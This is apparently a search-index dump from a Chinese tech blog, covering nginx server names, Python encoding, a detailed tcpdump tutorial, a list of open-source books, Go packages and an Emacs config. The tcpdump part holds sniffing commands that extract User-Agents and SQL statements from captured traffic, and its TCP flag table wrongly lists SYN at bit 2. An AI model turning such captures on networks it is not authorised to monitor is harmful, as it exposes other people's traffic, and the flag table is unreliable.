是指被圆括号引用的表达式部分，它们所匹配的字符串，可通过名字或数字引用）\n兼容性\n\n从 0.9.4 开始支持特殊主机名 “$hostname”\n\n从 0.8.48 开始，如果 server 区块中未定义 servername 指令，nginx 默认设定空字符串为主机名，如同定义了 servername \"\"\n\n从 0.8.25 开始支持在“正则表达式主机名”中使用 named capture 特性\n\n从 0.7.40 开始支持在“正则表达式主机名”中使用 capture 特性\n\n从 0.7.12 开始支持 \"\" 空字符串主机名\n\n从 0.6.25 开始，支持使用“正则表达式主机名”或者“通配主机名”作为第一个主机名。\n\n从 0.6.7 开始支持“正则表达式主机名”\n\n从 0.6.0 开始支持形如 example. 的“通配主机名”\n\n从 0.3.18 开始支持形如 .example.org 的特殊“通配主机名”\n\n从 0.1.13 开始支持形如 *.example.org 的“通配主机名”\n\nwritten by Igor Sysoev\nedited by Brian Mercer","tags":null},{"location":"//blog.pytool.com/Post/python/2016-06-01 python 编码基础","title":"python中，我们使用decode()和encode()来进行解码和编码","text":"---\npython中，我们使用decode()和encode()来进行解码和编码\n\n在python中，使用unicode类型作为编码的基础类型。即\n\n     decode              encode\n\nstr","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 Tcpdump","title":"Tcpdump的详细用法","text":"---\n聊聊tcpdump与Wireshark抓包分析 - 简书\n列出所有可用的网络接口\ntcpdump -D\n 抓包指定端口：\ntcpdump -nn -i any port 1234\n抓指定主机\ntcpdump -i eth1 -n host 123.132.226.66 or host 123.132.252.42 and tcp port 9011\ntcpdump -i eth1 -n src 123.132.226.66 or src 123.132.252.42 and  port 9011\n 显示抓包数据\n tcpdump -i eth1 -l -s 0 -w - dst port 80 | strings | grep -i User-Agent  显示 User-Agent 信息\n    -s 0 输出全部data内容\n    -w - 将报文写入到当前缓冲区\n tcpdump -i eth1 -l -s 0 -w - dst port 80 | strings | grep -i user-agent | grep -i -E 'bot|crawler|slurp|spider\n\n tcpdump -i any  -l -w - dst port 80 | strings  仅显示[GET POST]请求\n tcpdump -i any  -l -A dst port 80 | strings    显示更详细的连接建立过程\n tcpdump -i any  -l -A src 123.132.226.66 or src 123.132.252.42 and dst port 80 | strings    显示更详细的连接建立过程\n\ntcpdump -i any -nn port 80 -c 100|awk '{print $3}'|sort|uniq -c|sort -rn\n\n多级括号()\n tcpdump -nvvv -i any -c 20 '((port 80 or port 443) and (host 10.0.3.169 or host 10.0.3.1)) and dst host 10.0.3.246'\n\n sudo tcpdump -i any -s 0 -l -w - dst port 3306 -w tcpdump.out\ncat tcpdump.out | strings | grep -iE '^(UPDATE|DELETE|INSERT|SET|COMMIT|ROLLBACK|CREATE|DROP|ALTER)' | sed 's/$/;/g'   tcpdump.sql\n\nTCPDump介绍     \n\n  TcpDump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤,并提供and、or、not等逻辑语句来帮助你去掉无用的信息。tcpdump就是一种免费的网络分析工具,尤其其提供了源代码,公开了接口,因此具备很强的可扩展性,对于网络维护和入侵者都是非常有用的工具。tcpdump存在于基本的FreeBSD系统中,由于它需要将网络界面设置为混杂模式,普通用户不能正常执行,但具备root权限的用户可以直接执行它来获取网络上的信息。因此系统中存在网络分析工具主要不是对本机安全的威胁,而是对网络上的其他计算机的安全存在威胁。\n\n   我们用尽量简单的话来定义tcpdump,就是：dump the traffice on anetwork.,根据使用者的定义对网络上的数据包进行截获的包分析工具。作为互联网上经典的的系统管理员必备工具,tcpdump以其强大的功能,灵活的截取策略,成为每个高级的系统管理员分析网络,排查问题等所必备的东西之一。tcpdump提供了源代码,公开了接口,因此具备很强的可扩展性,对于网络维护和入侵者都是非常有用的工具。tcpdump存在于基本的FreeBSD系统中,由于它需要将网络界面设置为混杂模式,普通用户不能正常执行,但具备root权限的用户可以直接执行它来获取网络上的信息。因此系统中存在网络分析工具主要不是对本机安全的威胁,而是对网络上的其他计算机的安全存在威胁。  \n\nTcpDump的使用\n\ntcpdump采用命令行方式,它的命令格式为：\ntcpdump [ -adeflnNOpqStvx ] [ -c 数量 ] [ -F 文件名 ] [ -i 网络接口 ] [ -r 文件名] [ -s snaplen ] [ -T 类型 ] [ -w 文件名 ] [表达式 ]\n\n(1). tcpdump的选项介绍\n-D      列出所有可用的网络接口。\n\n-a 　　　将网络地址和广播地址转变成名字；\n-d 　　　将匹配信息包的代码以人们能够理解的汇编格式给出；\n-dd 　　 将匹配信息包的代码以c语言程序段的格式给出；\n-ddd 　　将匹配信息包的代码以十进制的形式给出；\n-f 　　　将外部的Internet地址以数字的形式打印出来；\n-l 　　　使标准输出变为 行缓冲 形式；如果不加-l选项，那么只有全缓冲区满，才会输出一次\n-n 　　　不把网络地址转换成名字；\n-nn     不进行端口名称的转换。\n-v 　　　输出一个稍微详细的信息,例如在ip包中可以包括ttl和服务类型的信息；\n-vv 　　 输出详细的报文信息；\n\n-nn：指定将每个监听到的数据包中的域名转换成IP、端口从应用名称转换成端口号后显示\n-p：将网卡设置为非混杂模式,不能与host或broadcast一起使用\n-F 　　　从指定的文件中读取表达式,忽略其它的表达式；\n\n-e      指定将监听到的数据包链路层的信息-包括源和目的 mac地址 ,以及网络层的协议 IPv4/6\n-t 　　　不输出时间信息；-t\n-c 　　　指定要监听的数据包数量,达到指定数量后自动停止抓包； -c 1000\n-i 　　　指定监听的网络接口； -i any 抓取所有网卡\n-s      指定要监听数据包的长度 -s 0 输出全部data内容\n-r 　　　从指定的文件中读取包(这些包一般通过-w选项产生)； -r dump.cap\n-w 　　　直接将包写入文件中,并不分析和打印出来； -w dump.cap d.pcap 写入到文件 -w - 写入到当前缓冲区\n-A      参数使返回值人类可读格式  -A 不与 -w 混用\n-X XX   十六禁止显示输出内容\n-T      强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:\n        aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),\n        cnfp (Cisco  NetFlow  protocol),  \n        rpc(Remote Procedure Call),\n        rtp (Real-Time Applications protocol),\n        rtcp (Real-Time Applications con-trol protocol),\n        snmp (Simple Network Management Protocol),\n        tftp (Trivial File Transfer Protocol, 碎文件协议),\n        vat (Visual Audio Tool, 可用于在internet 上进行电视电话会议的应用层协议)\n        wb (distributed White Board, 可用于网络会议的应用层协议).\n\n -A,数据包的内容以 ASCII 显示,通常用来捉取 WWW 的网页数据包资料。\n-c 在收到指定的数量的分组后,tcpdump就会停止。\n-C 在将一个原始分组写入文件之前,检查文件当前的大小是否超过了参数filesize 中指定的大小。如果超过了指定大小,则关闭当前文件,然后在打开一个新的文件。参数 filesize 的单位是兆字节（是1,000,000字节,而不是1,048,576字节）。\n-d 将匹配信息包的代码以人们能够理解的汇编格式给出。\n-dd 将匹配信息包的代码以C语言程序段的格式给出。\n-ddd 将匹配信息包的代码以十进制的形式给出。\n\n-e 在输出行打印出数据链路层的头部信息。\n-E 用spi@ipaddr algo:secret解密那些以addr作为地址,并且包含了安全参数索引值spi的IPsec ESP分组。\n-f 将外部的Internet地址以数字的形式打印出来。\n-F 从指定的文件中读取表达式,忽略命令行中给出的表达式。\n-i 指定监听的网络接口。\n-l 使标准输出变为缓冲行形式,可以把数据导出到文件。\n-L 列出网络接口的已知数据链路。\n-m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次,以导入多个MIB模块。\n-M 如果tcp报文中存在TCP-MD5选项,则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。\n-b 在数据-链路层上选择协议,包括ip、arp、rarp、ipx都是这一层的。\n-n 不把网络地址转换成名字。\n-nn 不进行端口名称的转换。\n-N 不输出主机名中的域名部分。例如,‘nic.ddn.mil‘只输出’nic‘。\n-t 在输出的每一行不打印时间戳。\n-O 不运行分组分组匹配（packet-matching）代码优化程序。\n-P 不将网络接口设置成混杂模式。\n-q 快速输出。只输出较少的协议信息。\n-r 从指定的文件中读取包(这些包一般通过-w选项产生)。\n-S 将tcp的序列号以绝对值形式输出,而不是相对值。\n-s 从每个分组中读取最开始的snaplen个字节,而不是默认的68个字节。\n-T 将监听到的包直接解释为指定的类型的报文,常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。\n-t 不在每一行中输出时间戳。\n-tt 在每一行中输出非格式化的时间戳。\n-ttt 输出本行和前面一行之间的时间差。\n-tttt 在每一行中输出由date处理的默认格式的时间戳。\n-u 输出未解码的NFS句柄。\n-v 输出一个稍微详细的信息,例如在ip包中可以包括ttl和服务类型的信息。\n-vv 输出详细的报文信息。\n-w 直接将分组写入文件中,而不是不分析并打印出来。\n\n-S：指定打印每个监听到的数据包的TCP绝对序列号而非相对序列号\n\ntcpdump -i eth0 -s 1400 -nn host 192.168.0.250 and ! 192.168.0.74 and icmp -e\n\n抓取网口eth0上192.168.0.250与除192.168.0.74外的其他主机之间的icmp报文\n\ntcpdump -i eth0 -s 1400 -nn tcp and \\(host 192.168.0.250 and ! 192.168.0.74\\)\n\n抓取网口eth0上192.168.0.250与除192.168.0.74外的所有tcp数据包,这里用到了括号,注意,在tcpdump中使用括号时必须用转义 。\n\ntcpdump -i eth0 ether src or dst 00:21:85:6C:D9:A3\n\n抓取网口eth0上源mac地址或目的mac地址为00:21:85:6C:D9:A3的所有数据包,注意,这里的mac地址格式必须以':'分隔。\n\n用tcpdump嗅探80端口的访问看看谁最高\ntcpdump  -i any -tnn dst port 80 -c 1000 | awk -F\".\" '{print  $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -nr  |head -20\n\n(2). tcpdump的表达式[过滤器(BPF语言)]的使用\n主要介绍在tcpdump中的过滤器使用,因为懂了这个就可以得心应手的使用wireshark了。\n         从最简单的开始,BPF语言主要有一个标志或者数字和限定词组成,限定词有三种：\n          第一种：指定类型 默认是host\n          host, 定义抓取哪个IP地址（也可以给它mac地址,格式是00:00:00:00:00:00）的数据包,比如我想抓有关192.168.0.148这个IP地址的数据包,那么就写成tcpdump host 192.168.0.148, host是限定词,192.168.0.148就是标志。这条命令会抓取从发出或者向192.168.0.148发送的数据包。\n          host 3sd.me 特定主机\n          net, 定义抓取某个网络的数据包,给出网络号就行了,它根据给的网络号字节数是1,2,3来判断A类地址,B类地址或者C类地址,比如tcpdump net 10.1.1 ,它就认为这是一个C类地址。\n          net 123.132 网路地址段\n\n          port,指定端口,比如tcpdump host and port 22, 这是抓端口为22的数据包,不管是TCP还是UDP的,这里我稍微早一点的给出了逻辑操作,and J,如果只想抓TCP的,那么可以写tcpdump host 192.168.0.148 and tcp port 22\n\n          portrange,顾名思义,这个是指定端口范围的,用连字符”-”指定范围,\n          portrange 1025-8080\n\n         第二种：指定方向 默认是src or dst\n          我们之前的命令都是说“这条命令会抓取从192.168.0.148发出或者向192.168.0.148发送”,所以,如果指向抓从发出的数据包可以使用限定词src, 命令：tcpdump src host 192.168.0.148,反过来,想抓发向192.168.0.148的数据包,使用限定词dst,命令：tcpdump dst host 192.168.0.148。\n\n        第三种：指定协议\n        我们知道网络协议有N种。。。我列一下常用的几种,其他的可以去google一下\n        ether和fddi, 以太网协议\n        tr, TR协议\n        ip, IP协议\n        ip6, IPv6协议\n        arp,  ARP协议\n        好了,最后还需要注意的是逻辑运算,and, or, not（与,或,非）,上面已经有一个例子了,和普通的编程语言没有什么不同。\n\n除此之外,还有更加牛X的功能,比如指定TCP中的某个标识位是什么,这种应用我一般很少用。\n第一种是关于类型的关键字,主要包括\n[host,net,port,portrange]\n   例如\n   host 210.27.48.2    指明210.27.48.2是一台主机,\n   net 123.132         指明 123.132.0.0/16是一段网络地址,\n   port 23             指明端口号是23。\n   portrange 1025-8080 指明端口范围\n   如果没有指定类型,缺省的类型是host\n\n第二种是确定传输方向的关键字,主要包括\n[src , dst ,dst or src, dst and src],这些关键字指明了传输的方向。举例说明,src 210.27.48.2 ,指明ip包中源地址是210.27.48.2 , dst net202.0.0.0 指明目的网络地址是202.0.0.0 。如果没有指明方向关键字,则缺省是src or dst关键字。\n\n第三种是协议的关键字,主要包括\n[tcp,udp,arp,rarp,ip,ip6,fddi,]等类型。Fddi指明是在FDDI(分布式光纤数据接口网络)上的特定的网络协议,实际上它是\"ether\"的别名,fddi和ether具有类似的源地址和目的地址,所以可以将fddi协议包当作ether的包进行处理和分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议,则tcpdump将会监听所有协议的信息包。\n\n除了这三种类型的关键字之外,其他重要的关键字如下：\ngateway,broadcast,less,greater,还有三种逻辑运算,取非运算是 'not ' '! ',与运算是'and','\u0026\u0026';或运算 是'or','││'；这些关键字可以组合起来构成强大的组合条件来满足人们的需要,\n\nproto [ expr : size ]\n　　proto表示该问的报文，expr的结果表示该报文的偏移，size为可选的，表示从expr偏移量起的szie个字节，整个表达式为proto报文 中,expr起的szie字节的内容（无符号整数）\n　　下面是expr relop expr这种形式primitive的例子：\n　　'ether[0] \u0026 1 !=0' ether报文中第0个bit为1，即以太网广播或组播的primtive。\n　　通过这种方式，我们可以对报文的任何一个字节进行匹配了，因此它的功能是十分强大的。\n　　‘ip[0] = 4’ ip报文中的第一个字节为version，即匹配IPv4的报文，\n　　如果我们想匹配一个syn报文，可以使用：'tcp[13] = 2'，因为tcp的标志位为TCP报文的第13个字节，而syn在这个字节的低1位，故匹配只有syn标志的报文,上述条件是可满要求的，并且比较严格。\n　　如果想匹配ping命令的请求报文，可以使用'icmp[0]=8'，因为icmp报文的第0字符表示类型，当类型值为8时表示为回显示请求。\n　　对于TCP和ICMP中常用的字节，如TCP中的标志位，ICMP中的类型，这个些偏移量有时会忘记。不过tcpdump为你提供更方便的用法，你不用记位这些数字，用字符就可以代替了.\n ICMP\n    icmptype:表示icmp报文中类弄字节的偏移量\n    icmpcode:表示icmp报文中编码字节的偏移量\nicmp-echoreply, icmp-unreach, icmp-sourcequench, icmp-redi‐rect, icmp-echo, icmp-routeradvert, icmp-routersolicit,icmp-timxceed, icmp-paramprob, icmp-tstamp, icmp-tstam‐preply, icmp-ireq, icmp-ireqreply, icmp-maskreq, icmp-maskreply.\n\n'icmp[icmptype] =8',如果8也记不住怎么办？tcpdump还为该字节的值也提供了字符表示,如'icmp[icmptype] = icmp-echo'。\n下面是tcpdump提供的字符偏移量：\n\nThere are 8 bits in the control bits section of the TCP header:\n        | CWR | ECE | URG | ACK | PSH | RST | SYN | FIN |\n        |  7  |  6  |  5  |  4  |  3  |  2  |  2  |  0  |\n\n      URG—为1表示高优先级数据包，紧急指针字段有效。\n      ACK—为1表示确认号字段有效\n      PSH—为1表示是带有PUSH标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。\n      RST—为1表示出现严重差错。可能需要重现创建TCP连接。还可以用于拒绝非法的报文段和拒绝连接请求。\n      SYN—为1表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步\n      FIN—为1表示发送方没有数据要传输了，要求释放连接。\n\nRecall the structure of a TCP header without options:\n\n      0             7|             15|             23|             31","tags":null},{"location":"//blog.pytool.com/Other/2016-10-04 开源书籍","title":"开源书籍","text":"原文\n目录\n\n语言无关\n  IDE\n  MySQL\n  NoSQL\n  PostgreSQL\n  Web\n  WEB服务器\n  其它\n  函数式概念\n  分布式系统\n  在线教育\n  大数据\n  操作系统\n  数据库\n  智能系统\n  正则表达式\n  版本控制\n  程序员杂谈\n  管理和监控\n  编程艺术\n  编译原理\n  编辑器\n  计算机图形学\n  设计模式\n  软件开发方法\n  项目相关\n语言相关\n  Android\n  AWK\n  C\n  C\n  C++\n  CoffeeScript\n  Dart\n  Elasticsearch\n  Elixir\n  Erlang\n  Fortran\n  Golang\n  Haskell\n  HTML / CSS\n  HTTP\n  iOS\n  Java\n  JavaScript\n  LaTeX\n  LISP\n  Lua\n  Markdown\n  Node.js\n  Perl\n  PHP\n  Python\n  R\n  reStructuredText\n  Ruby\n  Rust\n  Scala\n  Scheme\n  Shell\n  Swift\n  Vim\n  Visual Prolog\n\n语言无关\n\n IDE\n\nIntelliJ IDEA 简体中文专题教程\n\nMySQL\n\n21分钟MySQL入门教程\nMySQL索引背后的数据结构及算法原理\n\n NoSQL\n\nDisque 使用教程\nNeo4j .rb 中文資源\nNeo4j 简体中文手册 v1.8\nRedis 命令参考\nRedis 设计与实现\nThe Little MongoDB Book\nThe Little Redis Book\n带有详细注释的 Redis 2.6 代码\n带有详细注释的 Redis 3.0 代码\n\nPostgreSQL\n\nPostgreSQL 8.2.3 中文文档\nPostgreSQL 9.3.1 中文文档\n\n Web\n\n3 Web Designs in 3 Weeks\nChrome 开发者工具中文手册\nChrome扩展开发文档\nGrowth: 全栈增长工程师指南\nGrunt中文文档\nGulp 入门指南\ngulp中文文档\nHTTP 接口设计指北\nHTTP/2.0 中文翻译\nhttp2讲解\nJSON风格指南\nWireshark用户手册\n一站式学习Wireshark\n关于浏览器和网络的 20 项须知\n前端代码规范 及 最佳实践\n前端开发体系建设日记\n前端资源分享（一）\n前端资源分享（二）\n正则表达式30分钟入门教程\n浏览器开发工具的秘密\n移动Web前端知识库\n移动前端开发收藏夹\n\nWEB服务器\n\nApache 中文手册\nNginx开发从入门到精通 (淘宝团队出品)\nNginx教程从入门到精通 (PDF版本，运维生存时间出品)\n\n 其它\n\nOpenWrt智能、自动、透明翻墙路由器教程\nSAN 管理入门系列\nSketch 中文手册\n深入理解并行编程\n\n函数式概念\n\n傻瓜函数编程\n\n 分布式系统\n\n走向分布式 (PDF)\n\n在线教育\n\n51CTO学院\nCodecademy\nCodeSchool\nCoursera\nLearn X in Y minutes (数十种语言快速入门教程)\nshiyanlou\nTeamTreeHouse\nUdacity\nxuetangX\n慕课网 (丰富的移动端开发、php开发、web前端、html5教程以及css3视频教程等课程资源)\n极客学院\n计蒜客\n\n 大数据\n\nSpark 编程指南简体中文版\n大型集群上的快速和通用数据处理架构\n大数据/数据挖掘/推荐系统/机器学习相关资源\n数据挖掘中经典的算法实现和详细的注释\n面向程序员的数据挖掘指南\n\n操作系统\n\nDebian 参考手册 \nDocker —— 从入门到实践\nDocker中文指南\nDocker入门实战\nFreeBSD 使用手册\nFreeRADIUS新手入门\nLinux Documentation (中文版)\nLinux Guide for Complete Beginners\nLinux 构建指南\nLinux 系统高级编程\nLinux工具快速教程\nMac 开发配置手册\nOperating Systems: Three Easy Pieces\nThe Linux Command Line (中英文版)\nUbuntu 参考手册 \nuCore Lab: Operating System Course in Tsinghua University\nUNIX TOOLBOX\n命令行的艺术\n嵌入式 Linux 知识库 (eLinux.org 中文版)\n开源世界旅行手册\n深入分析Linux内核源码\n理解Linux进程\n鸟哥的 Linux 私房菜 基础学习篇\n鸟哥的 Linux 私房菜 服务器架设篇\n\n 数据库\n\nRedis 设计与实现\nThe Little MongoDB Book 中文版\n\n智能系统\n\n一步步搭建物联网系统\n\n 正则表达式\n\n正则表达式30分钟入门教程\n\n版本控制\n\nGit - 简易指南\nGit-Cheat-Sheet （感谢 @flyhigher139 翻译了中文版）\nGit Community Book 中文版\ngit-flow 备忘清单\nGit magic\nGit Magic\nGit 参考手册\nGithub帮助文档\nGitHub秘籍\nGit教程 （本文由 @廖雪峰 创作，如果觉得本教程对您有帮助，可以去 iTunes 购买）\nGot GitHub\nGotGitHub\nHgInit (中文版)\nMercurial 使用教程\nPro Git\nPro Git 中文版 (整理在gitbook上)\nsvn 手册\n学习 Git 分支 (点击右下角按钮可切换至简体及正体中文)\n沉浸式学 Git\n猴子都能懂的GIT入门\n\n 程序员杂谈\n\n程序员的自我修养\n\n管理和监控\n\nElasticSearch 权威指南\nElasticsearch 权威指南（中文版）\nELKstack 中文指南\nLogstash 最佳实践\nMastering Elasticsearch(中文版)\nPuppet 2.7 Cookbook 中文版\n\n 编程艺术\n\n取悦的工序：如何理解游戏 (豆瓣阅读，免费书籍)\n每个程序员都应该了解的内存知识(译)【第一部分】\n程序员编程艺术\n编程入门指南\n\n编译原理\n\n《计算机程序的结构和解释》公开课 翻译项目\n\n 编辑器\n\nexvim--vim 改良成IDE项目\nVim中文文档\n所需即所获：像 IDE 一样使用 vim\n笨方法学Vimscript 中译本\n\n计算机图形学\n\nOpenGL 教程\n\n 设计模式\n\n史上最全设计模式导学目录\n图说设计模式\n\n软件开发方法\n\n傻瓜函数编程 (《Functional Programming For The Rest of Us》中文版)\n硝烟中的 Scrum 和 XP\n\n 项目相关\n\nGNU make 指南\n\nGradle 2 用户指南\n\nGradle 中文使用文档\n\nJoel谈软件)\n\nselenium 中文文档\n\n开源软件架构\n\n持续集成（第二版） (译言网)\n\n約耳談軟體(Joel on Software)\n\n编码规范\n\n[\n\n    让开发自动化系列专栏](http://www.ibm.com/developerworks/cn/java/j-ap/)\n  [追求代码质量\n  \n  ](http://www.ibm.com/developerworks/cn/java/j-cq/)\n\n语言相关\n\n Android\n\nAndroid Design(中文版)\nAndroid Note(开发过程中积累的知识点)\nAndroid6.0新特性详解\nAndroid学习之路\nAndroid开发技术前线(android-tech-frontier)\nGoogle Android官方培训课程中文版\nGoogle Material Design 正體中文版 (译本一 译本二)\nMaterial Design 中文版\nPoint-of-Android Android 一些重要知识点解析整理\n\nAWK\n\nawk中文指南\nawk程序设计语言\n\n C\n\nC 语言常见问题集\nC/C++ 学习教程\nLinux C 编程一站式学习\n新概念 C 语言教程\n\nC Sharp\n\n精通C(第6版) \n\nC++\n\n100个gcc小技巧\n100个gdb小技巧\nC 语言编程透视\nC/C++ Primer - @andycai\nC++ FAQ LITE(中文版)\nC++ Primer 5th Answers\nC++ Template 进阶指南\nC++ 基础教程\nC++ 并发编程(基于C++11)\nC++ 并发编程指南\nCGDB中文手册\nCmake 实践 (PDF版)\nGNU make 指南\nGoogle C++ 风格指南\nQT 教程\nZMQ 指南\n像计算机科学家一样思考（C++版) (《How To Think Like a Computer Scientist: C++ Version》中文版)\n简单易懂的C魔法\n跟我一起写Makefile(PDF) (PDF)\n\n CoffeeScript\n\nCoffeeScript 中文\nCoffeeScript 编程风格指南\n\nDart\n\nDart 语言导览\n\n Elasticsearch\n\nElasticsearch 权威指南 （《Elasticsearch the definitive guide》中文版）\nELKstack 中文指南\nMastering Elasticsearch(中文版)\n\nElixir\n\nElixir Getting Started 中文翻译\nElixir 编程语言教程 (Elixir School)\nElixir元编程与DSL 中文翻译\nPhoenix 框架中文文档\n\n Erlang\n\nErlang 并发编程 (《Concurrent Programming in Erlang (Part I)》中文版)\n\nFortran\n\nFortran77和90/95编程入门\n\n Golang\nGo 学习笔记 (雨痕)\nEffective Go\nGo Web 编程\nGo 入门指南 (《The Way to Go》中文版)\nGo 官方文档翻译\nGo 指南 (《A Tour of Go》中文版)\nGo 简易教程 (《The Little Go Book》中文版)\nGo 编程基础\nGo 语言标准库\nGo命令教程\nGo实战开发\nGo语言博客实践\nJava程序员的Golang入门指南\nNetwork programming with Go 中文翻译版本\nRevel 框架手册\n学习Go语言\n\nGroovy\n\n实战 Groovy 系列\n\n Haskell\n\nHaskell 趣学指南\nReal World Haskell 中文版\n\nHTML / CSS\n\nCSS3 Tutorial 《CSS3 教程》\nCSS参考手册\nEmmet 文档\nHTML5 教程\nHTML和CSS编码规范\nSass Guidelines 中文\n前端代码规范 (腾讯 AlloyTeam 团队)\n学习CSS布局\n通用 CSS 笔记、建议与指导\n\n iOS\n\nApple Watch开发初探\nGoogle Objective-C Style Guide 中文版\niOS7人机界面指南\niOS开发60分钟入门\niPhone 6 屏幕揭秘\n网易斯坦福大学公开课：iOS 7应用开发字幕文件\n\nJava\n\nActiviti 5.x 用户指南\nApache MINA 2 用户指南\nApache Shiro 用户指南\nGoogle Java编程风格指南\nH2 Database 教程\nJava Servlet 3.1 规范\nJava 编码规范\nJersey 2.x 用户指南\nJSSE 参考指南\nMyBatis中文文档\nNetty 4.x 用户指南\nNetty 实战(精髓)\nREST 实战\nSpring Boot参考指南 (翻译中)\nSpring Framework 4.x参考文档\n用jersey构建REST服务\n\n Javascript\n\nAirbnb JavaScript 规范\nAngularJS\n  AngularJS中译本\n  AngularJS入门教程\n  AngularJS最佳实践和风格指南\n  在Windows环境下用Yeoman构建AngularJS项目\n  构建自己的AngularJS\nbackbone.js\n  backbone.js中文文档\n  backbone.js入门教程 (PDF)\n  Backbone.js入门教程第二版\n  Developing Backbone.js Applications(中文版)\nChrome扩展及应用开发\nCoffeeScript\n  CoffeeScript 编码风格指南\nD3.js\n  D3.js 入门系列 (还有进阶、高级等系列)\n  官方API文档\n  张天旭的D3教程\n  楚狂人的D3教程\nECMAScript 6 入门 (作者：阮一峰)\nExtJS\n  Ext4.1.0 中文文档\nGoogle JavaScript 代码风格指南\nGoogle JSON 风格指南\nimpress.js\n  impress.js的中文教程\nJavaScript Promise迷你书\nJavascript 原理\nJavaScript 标准参考教程（alpha）\n《JavaScript 模式》 “JavaScript patterns”中译本\njavascript 的 12 个怪癖\nJavaScript 秘密花园\nJavaScript核心概念及实践 (PDF) (此书已由人民邮电出版社出版发行，但作者依然免费提供PDF版本，希望开发者们去购买，支持作者)\nJavascript编程指南 (源码)\njQuery\n  How to write jQuery plugin\n  简单易懂的JQuery魔法\nMeteor\n  Discover Meteor\nNode.js\n  express.js 中文文档\n  Express框架\n  koa 中文文档\n  Learn You The Node.js For Much Win! (中文版)\n  Node debug 三法三例\n  Node.js 包教不包会\n  Nodejs Wiki Book (繁体中文)\n  nodejs中文文档\n  Node入门\n  七天学会NodeJS\n  使用 Express + MongoDB 搭建多人博客\nReact.js\n  Learn React \u0026 Webpack by building the Hacker News front page\n  React Native 中文文档(含最新Android内容)\n  React webpack-cookbook\n  React 入门教程\n  React.js 中文文档\nunderscore.js\n  Underscore.js中文文档\nYou-Dont-Know-JS (深入JavaScript语言核心机制的系列图书)\nZepto.js\n  Zepto.js 中文文档\n命名函数表达式探秘  (注:原文由为之漫笔 翻译，原始地址无法打开，所以此处地址为我博客上的备份)\n学用 JavaScript 设计模式 (开源中国)\n深入理解JavaScript系列\n\nLaTeX\n\nLaTeX 笔记\n一份不太简短的 LaTeX2ε 介绍\n大家來學 LaTeX (PDF)\n\n LISP\n\nANSI Common Lisp 中文翻译版\nCommon Lisp 高级编程技术 (《On Lisp》中文版)\n\nLua\n\nLua 5.3 参考手册\n\n Markdown\n\nMarkdown 快速入门\nMarkdown 简明教程\nMarkdown 语法说明\n献给写作者的 Markdown 新手指南\n\nNode.js\n\nNode 入门\nThe NodeJS 中文文档（社区翻译）\n七天学会NodeJS 阿里出品，很好的入门资料\n\n Perl\n\nMaster Perl Today\n《Modern Perl》中文版\nPerl 5 教程\nPerl 教程\n\nPHP\n\nPHP 之道\nPHP5中文手册\nPHP扩展开发及内核应用\nSymfony2 实例教程\n深入理解 PHP 内核\n\n Python\n\nDjango book 2.0\nPython 3 文档(简体中文) 3.2.2 documentation\nPython 中文学习大本营\n深入 Python 3\n笨办法学 Python\n\nR\n\n153分钟学会 R (PDF)\n《R for beginners》中文版 (PDF)\nR 导论 (《An Introduction to R》中文版) (PDF)\n用 R 构建 Shiny 应用程序 (《Building 'Shiny' Applications with R》中文版)\n统计学与 R 读书笔记 (PDF)\n\n reStructuredText\n\nreStructuredText 入门\nreStructuredText 简明教程\n\nRuby\n\nRails 风格指南\nRuby on Rails Tutorial 原书第 2 版\nRuby on Rails 实战圣经\nRuby 风格指南\n笨方法学 Ruby\n\n Rust\n\nRust 官方教程\nRust 语言学习笔记\nRustPrimer\n通过例子学习 Rust\n\nScala\n\nEffective Scala\nScala 初学者指南 (The Neophyte's Guide to Scala)\nScala 课堂 (Twitter的Scala中文教程)\n\n Scheme\n\nScheme 入门教程 (《Yet Another Scheme Tutorial》中文版)\n\nShell\n\nShell 编程基础\nShell 脚本编程30分钟入门\nThe Linux Command Line 中文版\n\n Swift\n\n《The Swift Programming Language》中文版\n\nVim\n\nVim Manual(中文版)\n大家來學 VIM\n\n Visual Prolog\n\nVisual Prolog 7初学指南\nVisual Prolog 7边练边学\n\nrel","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang扩展","title":"golang扩展","text":"go 语言包\ntime\n\n命令行\nhttps://github.com/urfave/cli.git\n\npackage main\n\nimport (\n  \"fmt\"\n  \"os\"\n\n  \"github.com/urfave/cli\"\n)\n\nfunc main() {\n  app := cli.NewApp()\n  app.Name = \"boom\"\n  app.Usage = \"make an explosive entrance\"\n  app.Version = \"\"\n  app.Action = func(c *cli.Context) error {\n    fmt.Println(\"boom! I say!\")\n    return nil\n  }\n\n  app.Run(os.Args)\n}\n 日志\n\"github.com/Sirupsen/logrus\"\n\noauth2\nhttps://github.com/golang/oauth2.git\n oauth2-server\nhttps://github.com/bitly/oauth2_proxy.git\nhttps://github.com/RichardKnop/go-oauth2-server.git\n\nRobotGo v0.10.0，Golang 跨平台 GUI 自动化系统","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 org-capture","title":"Emacs org capture的启用设定","text":"(setq org-capture-templates\n      '(\n\n        (\"t\" \"Todo\" entry (file+headline \"gtd.org\" \"待办事项\")\n         \" TODO %?\\n  %i\\n\"\n         :empty-lines 1)\n\n        (\"x\" \"NEXT\" entry (file+headline \"gtd.org\" \"下一步行动\")\n         \" NEXT [#B] %?\\n  %i\\n\"\n         :empty-lines 1)\n        (\"m\" \"MAYBE\" entry (file+headline \"gtd.org\" \"将来/也许\") \" MAYBE [#C]  %?\\n  %i\\n\" )\n\n        (\"w\" \"WAITING\" entry (file+headline \"gtd.org\" \"等待waiting\")\n         \" WAITING [#A] %? %^G  %i\\n %U\")\n\n        (\"l\" \"待确定讨论 CheckList\" checkitem  (file+headline \"gtd.org\" \"待确定\") \" [ ] %?\\n\\n\" :prepend t :kill-buffer t)\n\n        ;; For capturing details of bills\n        (\"z\" \"账单表格 Bill\"      table-line (file+headline \"gtd.org\" 